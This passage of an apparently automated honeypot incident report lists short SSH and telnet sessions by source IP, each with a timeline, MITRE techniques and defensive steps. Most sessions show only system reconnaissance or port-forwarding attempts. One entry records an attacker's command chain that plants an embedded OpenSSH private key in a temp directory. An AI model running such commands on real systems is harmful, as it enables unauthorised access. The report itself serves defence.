| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:49:56` | `cowrie.session.connect` |
| `2026-08-21 18:49:56` | `cowrie.client.version` |
| `2026-08-21 18:49:56` | `cowrie.client.kex` |
| `2026-08-21 18:49:56` | `cowrie.login.success` |
| `2026-08-21 18:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.253.5[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.253.5[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e74b63ae1485

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-21 18:49 |
| **Last Seen** | 2026-08-21 18:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:49:56` | `cowrie.session.connect` |
| `2026-08-21 18:49:56` | `cowrie.client.version` |
| `2026-08-21 18:49:56` | `cowrie.client.kex` |
| `2026-08-21 18:49:57` | `cowrie.login.success` |
| `2026-08-21 18:49:58` | `cowrie.session.params` |
| `2026-08-21 18:49:58` | `cowrie.command.input` |
| `2026-08-21 18:49:58` | `cowrie.session.file_download` |
| `2026-08-21 18:49:58` | `cowrie.session.file_download` |
| `2026-08-21 18:49:58` | `cowrie.log.closed` |
| `2026-08-21 18:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28f5d7a7f185

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 18:50 |
| **Last Seen** | 2026-08-21 18:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:50:24` | `cowrie.session.connect` |
| `2026-08-21 18:50:25` | `cowrie.client.version` |
| `2026-08-21 18:50:25` | `cowrie.client.kex` |
| `2026-08-21 18:50:28` | `cowrie.login.success` |
| `2026-08-21 18:50:29` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:50:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 18:50:30` | `cowrie.direct-tcpip.data` |
| `2026-08-21 18:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-990b01a752bc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 18:50 |
| **Last Seen** | 2026-08-21 18:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:50:28` | `cowrie.session.connect` |
| `2026-08-21 18:50:28` | `cowrie.client.version` |
| `2026-08-21 18:50:28` | `cowrie.client.kex` |
| `2026-08-21 18:50:29` | `cowrie.login.success` |
| `2026-08-21 18:50:29` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:50:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 18:50:30` | `cowrie.direct-tcpip.data` |
| `2026-08-21 18:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f45c65c1650

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:34` | `cowrie.session.connect` |
| `2026-08-21 18:53:34` | `cowrie.client.version` |
| `2026-08-21 18:53:34` | `cowrie.client.kex` |
| `2026-08-21 18:53:35` | `cowrie.login.success` |
| `2026-08-21 18:53:36` | `cowrie.session.params` |
| `2026-08-21 18:53:36` | `cowrie.command.input` |
| `2026-08-21 18:53:36` | `cowrie.log.closed` |
| `2026-08-21 18:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27833b5bc13d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:38` | `cowrie.session.connect` |
| `2026-08-21 18:53:38` | `cowrie.client.version` |
| `2026-08-21 18:53:38` | `cowrie.client.kex` |
| `2026-08-21 18:53:39` | `cowrie.login.success` |
| `2026-08-21 18:53:39` | `cowrie.session.params` |
| `2026-08-21 18:53:39` | `cowrie.command.input` |
| `2026-08-21 18:53:39` | `cowrie.log.closed` |
| `2026-08-21 18:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f562250e6a

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:42` | `cowrie.session.connect` |
| `2026-08-21 18:53:42` | `cowrie.client.version` |
| `2026-08-21 18:53:42` | `cowrie.client.kex` |
| `2026-08-21 18:53:42` | `cowrie.login.success` |
| `2026-08-21 18:53:43` | `cowrie.session.params` |
| `2026-08-21 18:53:43` | `cowrie.command.input` |
| `2026-08-21 18:53:43` | `cowrie.log.closed` |
| `2026-08-21 18:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8017736a824

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:45` | `cowrie.session.connect` |
| `2026-08-21 18:53:46` | `cowrie.telnet.option` |
| `2026-08-21 18:53:47` | `cowrie.telnet.option` |
| `2026-08-21 18:53:47` | `cowrie.login.success` |
| `2026-08-21 18:53:48` | `cowrie.session.params` |
| `2026-08-21 18:53:48` | `cowrie.log.closed` |
| `2026-08-21 18:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9bd8d03639

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:46` | `cowrie.session.connect` |
| `2026-08-21 18:53:46` | `cowrie.client.version` |
| `2026-08-21 18:53:46` | `cowrie.client.kex` |
| `2026-08-21 18:53:46` | `cowrie.login.success` |
| `2026-08-21 18:53:47` | `cowrie.session.params` |
| `2026-08-21 18:53:47` | `cowrie.command.input` |
| `2026-08-21 18:53:48` | `cowrie.log.closed` |
| `2026-08-21 18:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50155e22827f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:49` | `cowrie.session.connect` |
| `2026-08-21 18:53:49` | `cowrie.client.version` |
| `2026-08-21 18:53:49` | `cowrie.client.kex` |
| `2026-08-21 18:53:49` | `cowrie.login.success` |
| `2026-08-21 18:53:50` | `cowrie.session.params` |
| `2026-08-21 18:53:50` | `cowrie.command.input` |
| `2026-08-21 18:53:50` | `cowrie.log.closed` |
| `2026-08-21 18:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3786c1d1e035

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:49` | `cowrie.session.connect` |
| `2026-08-21 18:53:50` | `cowrie.client.version` |
| `2026-08-21 18:53:50` | `cowrie.client.kex` |
| `2026-08-21 18:53:53` | `cowrie.login.success` |
| `2026-08-21 18:53:54` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e679e4ae707

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:50` | `cowrie.session.connect` |
| `2026-08-21 18:53:50` | `cowrie.telnet.option` |
| `2026-08-21 18:53:51` | `cowrie.telnet.option` |
| `2026-08-21 18:53:51` | `cowrie.login.success` |
| `2026-08-21 18:53:52` | `cowrie.session.params` |
| `2026-08-21 18:53:52` | `cowrie.log.closed` |
| `2026-08-21 18:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-803ed7b034db

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:52` | `cowrie.session.connect` |
| `2026-08-21 18:53:52` | `cowrie.telnet.option` |
| `2026-08-21 18:53:53` | `cowrie.telnet.option` |
| `2026-08-21 18:53:53` | `cowrie.login.success` |
| `2026-08-21 18:53:53` | `cowrie.session.params` |
| `2026-08-21 18:53:53` | `cowrie.log.closed` |
| `2026-08-21 18:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8fdfa28cc5

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:53` | `cowrie.session.connect` |
| `2026-08-21 18:53:53` | `cowrie.client.version` |
| `2026-08-21 18:53:53` | `cowrie.client.kex` |
| `2026-08-21 18:53:53` | `cowrie.login.success` |
| `2026-08-21 18:53:54` | `cowrie.session.params` |
| `2026-08-21 18:53:54` | `cowrie.command.input` |
| `2026-08-21 18:53:54` | `cowrie.log.closed` |
| `2026-08-21 18:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f2e79478b7d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:54` | `cowrie.session.connect` |
| `2026-08-21 18:53:54` | `cowrie.telnet.option` |
| `2026-08-21 18:53:55` | `cowrie.telnet.option` |
| `2026-08-21 18:53:55` | `cowrie.login.success` |
| `2026-08-21 18:53:56` | `cowrie.session.params` |
| `2026-08-21 18:53:56` | `cowrie.log.closed` |
| `2026-08-21 18:53:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57d1c1e9cadc

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:56` | `cowrie.session.connect` |
| `2026-08-21 18:53:56` | `cowrie.telnet.option` |
| `2026-08-21 18:53:57` | `cowrie.telnet.option` |
| `2026-08-21 18:53:57` | `cowrie.login.success` |
| `2026-08-21 18:53:58` | `cowrie.session.params` |
| `2026-08-21 18:53:58` | `cowrie.log.closed` |
| `2026-08-21 18:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39bf29a91101

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:56` | `cowrie.session.connect` |
| `2026-08-21 18:53:56` | `cowrie.client.version` |
| `2026-08-21 18:53:56` | `cowrie.client.kex` |
| `2026-08-21 18:53:56` | `cowrie.login.success` |
| `2026-08-21 18:53:57` | `cowrie.session.params` |
| `2026-08-21 18:53:57` | `cowrie.command.input` |
| `2026-08-21 18:53:58` | `cowrie.log.closed` |
| `2026-08-21 18:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2a6c6d1a9cf

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:53 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:53:58` | `cowrie.session.connect` |
| `2026-08-21 18:53:59` | `cowrie.telnet.option` |
| `2026-08-21 18:53:59` | `cowrie.telnet.option` |
| `2026-08-21 18:53:59` | `cowrie.login.success` |
| `2026-08-21 18:54:00` | `cowrie.session.params` |
| `2026-08-21 18:54:00` | `cowrie.log.closed` |
| `2026-08-21 18:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acd2bba00414

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:00` | `cowrie.session.connect` |
| `2026-08-21 18:54:00` | `cowrie.client.version` |
| `2026-08-21 18:54:00` | `cowrie.client.kex` |
| `2026-08-21 18:54:00` | `cowrie.login.success` |
| `2026-08-21 18:54:01` | `cowrie.session.params` |
| `2026-08-21 18:54:01` | `cowrie.command.input` |
| `2026-08-21 18:54:01` | `cowrie.log.closed` |
| `2026-08-21 18:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ab7b3eaca5f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:02` | `cowrie.session.connect` |
| `2026-08-21 18:54:03` | `cowrie.telnet.option` |
| `2026-08-21 18:54:03` | `cowrie.telnet.option` |
| `2026-08-21 18:54:03` | `cowrie.login.success` |
| `2026-08-21 18:54:04` | `cowrie.session.params` |
| `2026-08-21 18:54:04` | `cowrie.log.closed` |
| `2026-08-21 18:54:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37c40c967803

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:03` | `cowrie.session.connect` |
| `2026-08-21 18:54:03` | `cowrie.client.version` |
| `2026-08-21 18:54:04` | `cowrie.client.kex` |
| `2026-08-21 18:54:04` | `cowrie.login.success` |
| `2026-08-21 18:54:05` | `cowrie.session.params` |
| `2026-08-21 18:54:05` | `cowrie.command.input` |
| `2026-08-21 18:54:05` | `cowrie.log.closed` |
| `2026-08-21 18:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ae07964a33d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:04` | `cowrie.session.connect` |
| `2026-08-21 18:54:05` | `cowrie.telnet.option` |
| `2026-08-21 18:54:06` | `cowrie.telnet.option` |
| `2026-08-21 18:54:06` | `cowrie.login.success` |
| `2026-08-21 18:54:06` | `cowrie.session.params` |
| `2026-08-21 18:54:06` | `cowrie.log.closed` |
| `2026-08-21 18:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f067c9b65a43

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:06` | `cowrie.session.connect` |
| `2026-08-21 18:54:07` | `cowrie.telnet.option` |
| `2026-08-21 18:54:08` | `cowrie.telnet.option` |
| `2026-08-21 18:54:08` | `cowrie.login.success` |
| `2026-08-21 18:54:08` | `cowrie.session.params` |
| `2026-08-21 18:54:08` | `cowrie.log.closed` |
| `2026-08-21 18:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f042a01bb77

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:06` | `cowrie.session.connect` |
| `2026-08-21 18:54:06` | `cowrie.client.version` |
| `2026-08-21 18:54:07` | `cowrie.client.kex` |
| `2026-08-21 18:54:07` | `cowrie.login.success` |
| `2026-08-21 18:54:08` | `cowrie.session.params` |
| `2026-08-21 18:54:08` | `cowrie.command.input` |
| `2026-08-21 18:54:08` | `cowrie.log.closed` |
| `2026-08-21 18:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fd006d0c7aa

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:08` | `cowrie.session.connect` |
| `2026-08-21 18:54:09` | `cowrie.telnet.option` |
| `2026-08-21 18:54:10` | `cowrie.telnet.option` |
| `2026-08-21 18:54:10` | `cowrie.login.success` |
| `2026-08-21 18:54:10` | `cowrie.session.params` |
| `2026-08-21 18:54:10` | `cowrie.log.closed` |
| `2026-08-21 18:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806f5e353cf5

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:10` | `cowrie.session.connect` |
| `2026-08-21 18:54:10` | `cowrie.client.version` |
| `2026-08-21 18:54:10` | `cowrie.client.kex` |
| `2026-08-21 18:54:11` | `cowrie.login.success` |
| `2026-08-21 18:54:11` | `cowrie.session.params` |
| `2026-08-21 18:54:11` | `cowrie.command.input` |
| `2026-08-21 18:54:11` | `cowrie.log.closed` |
| `2026-08-21 18:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03db82e99706

| Field | Detail |
|---|---|
